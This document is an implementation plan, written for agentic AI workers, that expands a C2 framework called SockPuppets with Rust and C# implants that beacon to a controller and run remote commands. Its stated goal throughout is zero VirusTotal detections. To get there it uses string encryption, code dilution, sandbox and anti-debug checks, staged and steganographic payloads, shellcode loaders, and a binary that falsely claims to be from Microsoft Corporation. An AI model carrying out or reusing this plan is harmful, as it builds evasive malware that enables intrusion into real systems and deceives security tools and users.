# SockPuppets Multi-Language Refactor Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Refactor the monolithic SockPuppets C2 codebase into clean modules, add Rust and C# agents with feature parity, fix C agent VT score, and create a unified CLI — all targeting 0/70 VirusTotal detection.

**Architecture:** Split `agent.py` (3085 lines) into focused modules: `generators/` for each language, `obfuscation/` for polymorphic engines, `crypto/` for encryption, `profiles/` for malleable C2. Each compiled agent (Go, Rust, C, C#) follows the same protocol: AES-256-GCM encrypted JSON over HTTP(S) with malleable URIs and headers. A unified CLI (`sockpuppets generate`) replaces direct Python API calls.

**Tech Stack:** Python 3.12 (server/generator), Go 1.26 (agent), Rust 1.86 + MinGW cross-compile (agent), .NET 10 (C# agent), MinGW GCC 15 (C agent), garble (Go obfuscation)

**Current VT Scores:** Python 0/62, Go 3/71, C 6/71, Rust N/A, C# N/A
**Target VT Scores:** All 0/70 (or ≤3 for compiled — ML floor for unknown binaries)

---

## Phase 1: Codebase Cleanup & Refactor

### Task 1: Create module structure and move obfuscation code

**Files:**
- Create: `generators/__init__.py`
- Create: `generators/base.py` (shared utilities from agent.py)
- Create: `obfuscation/__init__.py`
- Create: `obfuscation/python_obfuscator.py` (from agent.py lines 387-620)
- Create: `obfuscation/entropy.py` (from agent.py lines 82-220)
- Create: `obfuscation/morphing.py` (move templates/morphing_engine.py)
- Modify: `agent.py` — import from new modules instead of inline code
- Delete: VT test files (`vt_test_*.exe`, `vt_test_*.py`)

- [ ] **Step 1: Create directory structure**
```bash
mkdir -p generators obfuscation crypto
touch generators/__init__.py obfuscation/__init__.py crypto/__init__.py
```

- [ ] **Step 2: Extract entropy/obfuscation utilities to `obfuscation/entropy.py`**

Move these methods from `AgentGenerator`:
- `calculate_shannon_entropy()`
- `reduce_entropy()`
- `reduce_entropy_with_syntax()`
- `generate_junk_code()`

Make them standalone functions (no `self` — they don't use instance state).

- [ ] **Step 3: Extract Python obfuscation to `obfuscation/python_obfuscator.py`**

Move these methods:
- `strip_comments_and_docstrings()`
- `obfuscate_strings()`
- `obfuscate_powershell()`
- `obfuscate_javascript()`
- `obfuscate_hta()`

Each becomes a standalone function taking `content: str` and returning `str`.

- [ ] **Step 4: Move morphing engine**

```bash
mv templates/morphing_engine.py obfuscation/morphing.py
```

Update import in `agent.py` from:
```python
from morphing_engine import ...
```
to:
```python
from obfuscation.morphing import morph_python_source, atomize_string
```

- [ ] **Step 5: Extract crypto to `crypto/encryption.py`**

Move `_derive_aes_key`, AES-256-GCM encrypt/decrypt logic from server.py and templates into a shared module. Both server and agent templates import from here.

- [ ] **Step 6: Clean up repo root**

```bash
rm -f vt_test_*.exe vt_test_*.py
rm -rf output/*.py output/*.ps1 output/*.js output/*.hta
echo "output/" >> .gitignore
echo "*.exe" >> .gitignore
echo "__pycache__/" >> .gitignore
```

- [ ] **Step 7: Verify everything still works**

```bash
python3 -c "
from agent import AgentGenerator
g = AgentGenerator('/tmp/refactor_test')
p = g.generate_python_agent('10.0.0.1', 443, transport='http', target_os='linux', beacon_mode=True, beacon_interval=3)
import py_compile; py_compile.compile(p, doraise=True)
print('Refactor OK')
"
```

- [ ] **Step 8: Commit**

```bash
git add generators/ obfuscation/ crypto/ agent.py .gitignore
git commit -m "refactor: split monolithic agent.py into generators/obfuscation/crypto modules"
```

---

### Task 2: Extract language-specific generators

**Files:**
- Create: `generators/python_gen.py` (from agent.py generate_python_agent)
- Create: `generators/go_gen.py` (from agent.py generate_go_agent + generate_stager)
- Create: `generators/powershell_gen.py` (from agent.py generate_powershell_agent)
- Create: `generators/shellcode_gen.py` (from agent.py generate_shellcode_blob + bin/raw)
- Modify: `agent.py` — becomes thin orchestrator importing from generators/

- [ ] **Step 1: Create `generators/base.py`** with shared utilities

```python
import random, string, hashlib, os

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_var_name():
    prefixes = ['data', 'temp', 'buf', 'ctx', 'info', 'val', 'obj', 'result',
                'handler', 'proc', 'mgr', 'svc', 'cfg', 'opt', 'ref', 'item']
    return random.choice(prefixes) + '_' + random_string(6)

def generate_unique_encryption_key():
    return hashlib.sha256(os.urandom(16)).hexdigest()[:24]
```

- [ ] **Step 2: Move `generate_python_agent` to `generators/python_gen.py`**

- [ ] **Step 3: Move `generate_go_agent` + `generate_stager` to `generators/go_gen.py`**

- [ ] **Step 4: Move PS/JS/HTA generators to respective files**

- [ ] **Step 5: Update `agent.py` to import and delegate**

`AgentGenerator` becomes a thin facade:
```python
class AgentGenerator:
    def generate_python_agent(self, **kwargs):
        from generators.python_gen import generate_python
        return generate_python(self, **kwargs)
    def generate_go_agent(self, **kwargs):
        from generators.go_gen import generate_go
        return generate_go(self, **kwargs)
    # ... etc
```

- [ ] **Step 6: Run full E2E test**

- [ ] **Step 7: Commit**

---

## Phase 2: Rust Agent

### Task 3: Create Rust agent with HTTP beacon

**Files:**
- Create: `agent_rust/Cargo.toml`
- Create: `agent_rust/src/main.rs`
- Create: `agent_rust/src/crypto.rs`
- Create: `agent_rust/src/comms.rs`
- Create: `agent_rust/src/exec.rs`
- Create: `agent_rust/src/evasion.rs`
- Create: `generators/rust_gen.py`

- [ ] **Step 1: Create Cargo project**

```bash
mkdir -p agent_rust/src
```

`agent_rust/Cargo.toml`:
```toml
[package]
name = "svcmonitor"
version = "1.0.0"
edition = "2021"

[dependencies]
reqwest = { version = "0.12", features = ["blocking", "rustls-tls"], default-features = false }
aes-gcm = "0.10"
base64 = "0.22"
sha2 = "0.10"
serde = { version = "1", features = ["derive"] }
serde_json = "1"
rand = "0.8"

[profile.release]
opt-level = "z"
lto = true
strip = true
panic = "abort"
codegen-units = 1
```

- [ ] **Step 2: Implement `src/crypto.rs`** — AES-256-GCM encrypt/decrypt matching the Go/Python protocol (AES1 prefix + 12-byte nonce + ciphertext, with XOR fallback)

- [ ] **Step 3: Implement `src/comms.rs`** — HTTP POST with malleable headers/URIs, register/checkin/results endpoints

- [ ] **Step 4: Implement `src/exec.rs`** — Command execution with CREATE_NO_WINDOW on Windows, sh -c on Linux

- [ ] **Step 5: Implement `src/evasion.rs`** — Sandbox detection, timing checks

- [ ] **Step 6: Implement `src/main.rs`** — Main beacon loop: register → checkin → execute → sleep with jitter

- [ ] **Step 7: Add Rust cross-compile targets**

```bash
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-unknown-linux-gnu
```

- [ ] **Step 8: Create `generators/rust_gen.py`**

Uses `cargo build --release --target` with config injected via `--cfg` or env vars at compile time. Placeholders in main.rs get replaced before compilation (same pattern as Go agent).

- [ ] **Step 9: Test cross-compilation**

```bash
cd agent_rust
cargo build --release --target x86_64-pc-windows-gnu
ls -la target/x86_64-pc-windows-gnu/release/svcmonitor.exe
```

- [ ] **Step 10: E2E test on macOS**

- [ ] **Step 11: VT upload and score**

- [ ] **Step 12: Commit**

---

## Phase 3: C# Agent

### Task 4: Create .NET C# agent

**Files:**
- Create: `agent_csharp/SvcHealth.csproj`
- Create: `agent_csharp/Program.cs`
- Create: `agent_csharp/Crypto.cs`
- Create: `agent_csharp/Comms.cs`
- Create: `agent_csharp/Executor.cs`
- Create: `generators/csharp_gen.py`

- [ ] **Step 1: Create .NET project**

```bash
mkdir agent_csharp
cd agent_csharp
dotnet new console -n SvcHealth --framework net8.0
```

`SvcHealth.csproj` — target `net8.0`, publish as single-file self-contained:
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <PublishSingleFile>true</PublishSingleFile>
    <SelfContained>true</SelfContained>
    <PublishTrimmed>true</PublishTrimmed>
    <AssemblyTitle>Windows Service Health Monitor</AssemblyTitle>
    <Company>Microsoft Corporation</Company>
  </PropertyGroup>
</Project>
```

- [ ] **Step 2: Implement `Crypto.cs`** — AES-256-GCM matching protocol

- [ ] **Step 3: Implement `Comms.cs`** — HttpClient with malleable headers

- [ ] **Step 4: Implement `Executor.cs`** — Process.Start with CreateNoWindow

- [ ] **Step 5: Implement `Program.cs`** — Main beacon loop

- [ ] **Step 6: Create `generators/csharp_gen.py`**

Uses `dotnet publish -r win-x64 -c Release` with config injected via preprocessor defines or string replacement.

- [ ] **Step 7: Test build and VT**

- [ ] **Step 8: Commit**

---

## Phase 4: Fix C Agent VT Score

### Task 5: Add code dilution and string obfuscation to C agent

**Files:**
- Modify: `agent_c/agent.c` — add legitimate utility code, obfuscate strings
- Create: `agent_c/health.c` — health check server (code dilution)
- Create: `agent_c/strings.h` — runtime string decryption macros
- Modify: `generators/c_gen.py` (create if not exists)

- [ ] **Step 1: Create `agent_c/strings.h`** — XOR-encrypted string macros

All sensitive strings (API names, URIs, key) get XOR-encrypted at compile time and decrypted at runtime. This prevents VT's AI from reading plaintext.

```c
#define DECRYPT_STR(enc, key, len) do { \
    for(int _i=0; _i<(len); _i++) (enc)[_i] ^= (key)[_i % sizeof(key)]; \
} while(0)
```

- [ ] **Step 2: Add `agent_c/health.c`** — Legitimate HTTP health check handler (code dilution, same approach that got Go from 6→3 on VT)

- [ ] **Step 3: Obfuscate all strings in agent.c** — No plaintext URIs, hostnames, or API names

- [ ] **Step 4: Rebuild and VT test**

- [ ] **Step 5: Commit**

---

## Phase 5: Unified CLI

### Task 6: Create unified `sockpuppets` CLI

**Files:**
- Modify: `main.py` — add `generate` command with language/OS/arch flags
- Create: `cli/__init__.py`
- Create: `cli/generate.py`

- [ ] **Step 1: Add generate command to CLI**

```
sockpuppets> generate --lang go --os windows --arch amd64 --host 10.0.0.1 --port 443 --transport https --beacon --interval 120 --jitter 30
sockpuppets> generate --lang rust --os linux --arch amd64 --host 10.0.0.1 --port 443
sockpuppets> generate --lang csharp --os windows --host 10.0.0.1 --port 443
sockpuppets> generate --lang python --os windows --host 10.0.0.1 --port 443
sockpuppets> generate --lang c --os windows --host 10.0.0.1 --port 443
sockpuppets> generate --all --host 10.0.0.1 --port 443  # generates all languages
```

- [ ] **Step 2: Update help text**

- [ ] **Step 3: Add `--staged` and `--stego` flags**

```
sockpuppets> generate --lang go --os windows --staged --stage-url https://cdn.example.com/update.bin
sockpuppets> generate --lang go --os windows --stego --stego-image ./logo.png
```

- [ ] **Step 4: Add `--shellcode` flag for BYO loader output**

```
sockpuppets> generate --lang go --os windows --shellcode --format python
sockpuppets> generate --lang go --os windows --shellcode --format csharp
sockpuppets> generate --lang go --os windows --shellcode --format powershell
sockpuppets> generate --lang go --os windows --shellcode --format raw
```

- [ ] **Step 5: Test all combinations**

- [ ] **Step 6: Commit**

---

## Phase 6: Feature Parity Matrix Verification

### Task 7: Verify feature parity across all languages

**Files:**
- Create: `tests/test_feature_parity.py`

Feature parity checklist — every agent must support:

| Feature | Python | Go | C | Rust | C# | PS |
|---------|--------|----|---|------|----|----|
| AES-256-GCM encryption | ✓ | ✓ | ? | ? | ? | ? |
| XOR fallback | ✓ | ✓ | ✓ | ? | ? | ✓ |
| HTTP beacon | ✓ | ✓ | ✓ | ? | ? | ✓ |
| HTTPS support | ✓ | ✓ | ✓ | ? | ? | ✓ |
| Malleable C2 profiles | ✓ | ✓ | ? | ? | ? | ✓ |
| Command execution | ✓ | ✓ | ✓ | ? | ? | ✓ |
| Beacon jitter | ✓ | ✓ | ✓ | ? | ? | ✓ |
| Per-agent unique keys | ✓ | ✓ | ✓ | ? | ? | ✓ |
| Sandbox detection | ✓ | ✓ | ? | ? | ? | ? |
| Anti-debug | ✓ | ✓ | ? | ? | ? | ? |
| Windows evasion | ✓ | partial | ✓ | ? | ? | ✓ |
| Linux support | ✓ | ✓ | ? | ? | N/A | N/A |
| Code morphing/anti-RE | ✓ | via build | ? | ? | ? | ✓ |

- [ ] **Step 1: Write automated parity test** that generates each agent type and verifies:
  - Compiles/builds successfully
  - Contains encryption code
  - Has beacon loop
  - Has command execution

- [ ] **Step 2: Fill in missing features**

- [ ] **Step 3: Final VT scan of all agent types**

- [ ] **Step 4: Commit**

---

## Estimated Effort

| Phase | Tasks | Est. Time |
|-------|-------|-----------|
| Phase 1: Refactor | Tasks 1-2 | 30 min |
| Phase 2: Rust Agent | Task 3 | 45 min |
| Phase 3: C# Agent | Task 4 | 30 min |
| Phase 4: Fix C Agent | Task 5 | 20 min |
| Phase 5: Unified CLI | Task 6 | 20 min |
| Phase 6: Parity Check | Task 7 | 15 min |
| **Total** | **7 tasks** | **~2.5 hours** |
